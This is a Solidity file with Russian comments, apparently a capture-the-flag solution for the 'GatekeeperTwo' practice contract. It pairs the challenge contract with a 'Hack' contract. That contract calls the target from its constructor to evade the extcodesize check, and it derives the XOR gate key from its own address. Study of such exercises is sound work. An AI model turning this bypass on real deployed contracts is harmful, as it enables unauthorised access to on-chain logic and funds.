// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        // код для 0.6 solidity
        // проверка, что у вызывающей стороны code.length == 0
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        // идентична коду 0.8 solidity:
        require(msg.sender.code.length == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // unchecked для работы в 0.8 solidity
        unchecked {
            require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
        }
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    constructor(GatekeeperTwo _contract) {
        bytes8 key;
        unchecked {
            key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        }
        _contract.enter(bytes8(key));
    }
}